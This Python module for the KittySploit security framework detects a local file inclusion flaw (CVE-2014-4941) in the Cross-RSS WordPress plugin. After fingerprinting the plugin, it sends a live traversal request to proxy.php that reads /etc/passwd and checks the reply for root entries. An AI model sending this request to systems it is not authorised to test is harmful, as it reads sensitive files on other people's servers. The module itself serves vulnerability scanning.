#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Absolute path traversal vulnerability in Cross-RSS (wp-cross-rss) plugin 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cross RSS 1.7 - Local File Inclusion Detection',
        'description': 'Absolute path traversal vulnerability in Cross-RSS (wp-cross-rss) plugin 1.7 for WordPress allows remote attackers to read arbitrary files via a full pathname in the rss parameter to proxy.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'wp-cross-rss', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wordpress.org/plugins/cross-rss/',
            'https://codevigilant.com/disclosure/wp-plugin-cross-rss-local-file-inclusion/',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-4941',
        ],
        'cve': 'CVE-2014-4941',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/cross-rss/',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/cross-rss/proxy.php?rss=/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='medium', reason='Cross RSS 1.7 - Local File Inclusion detected', path=path)
            return True
        return False

